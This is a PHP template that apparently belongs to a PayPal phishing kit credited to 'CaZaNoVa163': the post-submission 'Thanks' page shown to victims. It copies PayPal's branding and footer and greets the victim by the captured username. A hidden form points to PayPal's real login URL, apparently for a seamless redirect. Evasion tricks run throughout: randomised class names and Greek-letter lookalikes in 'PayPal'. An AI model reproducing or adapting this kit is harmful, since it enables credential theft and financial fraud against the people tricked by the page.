<?php
include 'inc/config.php';
include 'language.php';
?>
    <html lang="en">

    <head>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        <link rel="stylesheet" href="./file/font-sans.css">
        <link rel="stylesheet" href="./file/template.css">
        <link rel="stylesheet" href="./file/css.css">
        <title>PayPal - Thanks.</title>
        <meta name="description" content="xPayPal_2017 v1.1 | Coded By CaZaNoVa163">
        <meta name="author" content="CaZaNoVa163">
        <meta http-equiv="x-ua-compatible" content="ie=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <script type="text/javascript" src="./file/jquery.min.js"></script>
        <script type="text/javascript" src="./file/jstz.min.js"></script>
        <script type="text/javascript" src="./file/jquery.mobile.custom.min.js"></script>
        <script type="text/javascript" src="./file/jquery.browser.min.js"></script>
        <link rel="icon" type="image/png" href="img/favicon.ico">
    </head>

    <body>
        <div id="loader" class="xmzxf1fo9  spinner 1gl tbm4spvpfv9dy94zxg" style="display: none; opacity: 0;">
            <p id="loading_title">Redirecting...</p>
        </div>
        <div id="ajax" style="opacity: 1;">
            <script type="text/javascript" src="./file/thanks.js"></script>
            <style>
body {
    background-color: #f8f8f8;
}

            </style>
            <div id="header_update">
                <div class="jx9d3yv3slugie hrfrn0m9 container_update for_nav">
                    <div id="menu_btn_update"></div>
                    <div id="logo_update"></div>
                    <ul class="sbatv5ctp9ru7dh3859jfni9zo nav">
                        <li class="4xf6g21kmhk42i nav-item">
                            <a class="rcf6fwakryqn6ifhwnsrg1qi4pf7y nav-link" href="#">
                                <?=$language['thanks']['navbar'][1];?>
                            </a>
                        </li>
                        <li class="4z3kc0uj8gyqy6i nav-item">
                            <a class="q88usfzm5sy9ijihr8zg48m a9 nav-link" href="#">
                                <?=$language['thanks']['navbar'][2];?>
                            </a>
                        </li>
                        <li class="oub2quqp40ycix2pr02r2235 nav-item">
                            <a class="j535mizd82mvv2dmvvfnparg nav-link" href="#">
                                <?=$language['thanks']['navbar'][3];?>
                            </a>
                        </li>
                        <li class="kzhuplsizd4rigc4mrko9s2lo77np1j0rrk744gt9abhi nav-item">
                            <a class="9l160gy 7gsiemcl7cn9kweni22jpzdob5l2ba3 hli nav-link" href="#">
                                <?=$language['thanks']['navbar'][4];?>
                            </a>
                        </li>
                        <li class="z1f8u9i ymo1i1tk2nk zunp7bcnezf4rl3bkcb q nav-item">
                            <a class="cp6q54s8iyyotg1nicqlc74 nav-link" href="#">
                                <?=$language['thanks']['navbar'][5];?>
                            </a>
                        </li>
                    </ul>
                    <div id="logout">
                        <div class="lqxd2sbzixv sub_logout">
                            <button><?=$language['thanks']['navbar'][6];?></button>
                        </div>
                        <div class="yawtjwufx6wlap4d sub_logout" id="setting">
                        </div>
                        <div class="rrabyz9laa15e7 7ylsnmu26fb sub_logout" id="alert">
                        </div>
                    </div>
                </div>
            </div>
            <div id="update_content">
                <div class="kjn01pmbvs8mdf container_update">
                    <div class=" mp0e6dgswe5 row first">
                        <div class="oge gczjfzwwp1st9bg twelve columns">
                            <div id="form_thanks">
                                <div><img src="./file/done.png"></div>
                                <div id="hdr"><b><?=$language['thanks']['content'][1];?><br><?=$_SESSION['user'];?> ,</b></div>
                                <div id="cntn">
                                    <?=$language['thanks']['content'][2];?>
                                        <?=$language['thanks']['content'][3];?>
                                            <?=$language['thanks']['content'][4];?>
                                                <?=$language['thanks']['content'][5];?>
                                                    <?=$language['thanks']['content'][6];?> <br><button type="button" class="ig8s piyukjtqmaei1zz3tjrlug8hktqr button-primary" id="btn_myaccount">My &#929;ay&#929;al</button>&nbsp;&nbsp;<button type="button" id="btn_logout"> <?=$language['thanks']['content'][7];?></button><br>
                                                        <?=$language['thanks']['content'][8];?>
                                </div>
                            </div>
                            <div style="display:none" id="loginform">
                                <form id="form-ppcom" method="post" name="login_form" action="https://www.paypal.com/cgi-bin/webscr?cmd=_login-submit" autocomplete="off" novalidate="">
                                </form>
                            </div>
                        </div>
                    </div>
                    <div id="footer_update_mobile">
                        <div class="h87ghxvvebzqss tgq3jh row footer_row_1">
                            <font class="oi3dzlw064hzdppxkfsvpgi9d4qixv c53huf4lc footer1">Help&nbsp;&amp;&nbsp;Contact&nbsp;&nbsp;Security</font>
                        </div>
                        <div class="pa76if6n nwx9x14q9px310 row footer_row_2">
                            <font class="ripr6glnf2a u2u6n9ih67s4s0bk5ybn7s53zhh6  footer2">В© 1999-
                                <?=date("Y");?> PayPal, Inc. All rights reserved.</font>
                        </div>
                    </div>
                </div>
            </div>
            <div id="footer_update">
                <div class="rsy  3etjys9hwqsi7vb75ch4qwm container_update">
                    <div class="bx3 i68d9f9p3m egb9zd4akiwgghl1j9 row footer_row_1">
                        <font class="wdhyprkwys8p37bdftmta278ay footer1">Help&nbsp;&amp;&nbsp;Contact&nbsp;&nbsp;Security</font><img src="./file/feedback.png"></div>
                    <div class="a1m4yl5mil9fgigjgy5p2eh row footer_row_2">
                        <font class="w8c4gkdo9 52ecx 7uxpyw t8oewyctlawfi7ky7ltzqxnr footer2">В© 1999-
                            <?=date("Y");?> PayPal, Inc. All rights reserved.</font>
                        <font class="1omodq8qsvw1s8pqj g footer3">|</font>
                        <font class="hhjq z4o3lmk488vr6b8 footer4">Privacy&nbsp;&nbsp;&nbsp;Legal&nbsp;&nbsp;&nbsp;Policy updates</font>
                    </div>
                </div>
            </div>
        </div>
    </body>

    </html>
